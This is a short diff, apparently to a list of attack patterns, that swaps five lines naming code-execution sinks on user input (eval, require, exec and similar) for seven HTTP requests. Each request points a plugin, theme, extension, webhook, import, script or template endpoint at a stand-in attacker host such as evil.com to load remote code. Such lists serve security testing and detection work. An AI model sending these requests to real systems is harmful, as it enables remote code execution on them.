@@ -1,5 +1,7 @@
-eval(userInput)
-require(userControlledPath)
-import(userControlledModule)
-exec(userCode)
-__import__(user_module).run()
+POST /api/plugin {"source":"http://evil.com/plugin.zip"}
+POST /api/theme {"url":"http://attacker.com/theme.tar.gz"}
+PUT /api/extension {"cdn":"//evil.com/ext.js"}
+POST /api/webhook {"code":"http://attacker.com/hook.js"}
+POST /api/import {"library":"http://evil.com/lib.min.js"}
+GET /api/load?script=http://attacker.com/inject.js
+POST /api/template {"engine":"http://evil.com/template"}
